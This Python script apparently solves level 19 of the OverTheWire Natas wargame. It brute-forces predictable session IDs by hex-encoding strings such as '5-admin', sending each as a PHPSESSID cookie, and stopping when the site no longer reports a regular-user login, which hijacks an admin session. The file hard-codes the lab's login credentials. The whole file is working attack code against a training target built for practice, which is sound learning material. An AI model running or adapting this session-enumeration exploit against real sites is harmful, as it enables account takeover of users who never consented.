#!/bin/python
import requests, binascii

base_url = "http://natas19.natas.labs.overthewire.org/index.php"
auth_username = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

for i in range(640):
  plainstr = "{0}-admin".format(i)
  hexstr = binascii.hexlify(plainstr)
  print("Encoded String {0} -> {1}".format(plainstr, hexstr))
  headers = {"Cookie": "PHPSESSID={0}".format(hexstr) }
  payload = {"username": "any", "password": "any" }
  r = requests.post(base_url, auth=(auth_username, auth_password), headers=headers, data=payload)  
  if "You are logged in as a regular user" in r.text:
    print("PHPSESSID={0} : Failed".format(i))
  else:
    print("PHPSESSID={0} : Success".format(i))
    print(r.text)
    break
print("Test complete.")

